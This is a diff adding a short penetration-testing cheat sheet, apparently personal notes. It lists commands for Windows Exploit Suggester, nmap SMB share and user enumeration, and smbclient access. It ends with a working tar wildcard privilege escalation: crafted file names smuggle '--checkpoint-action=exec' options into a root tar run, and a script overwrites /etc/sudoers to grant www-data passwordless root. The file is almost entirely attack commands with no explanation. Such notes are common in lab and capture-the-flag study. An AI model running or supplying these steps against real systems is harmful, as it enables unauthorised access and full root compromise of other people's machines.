@@ -1,0 +1,18 @@
+-windows exploit suggester-
+./windows-exploit-suggester.py --database 2021-10-15-mssb.xls --ostext 'Windows 2012 R2'
+
+-nmaping smb-
+$nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
+
+-smb list-
+$smbclient -L \\<ip>\
+
+-smb connect-
+$smbclient \\<ip>\<share> -U <user>
+
+-exploiting misconfigure tar-
+$cat root.sh
+echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers
+$touch ./--checkpoint-action\=exec\=sh\ root.sh
+$touch ./--checkpoint=1
+$sudo -u root /bin/bash
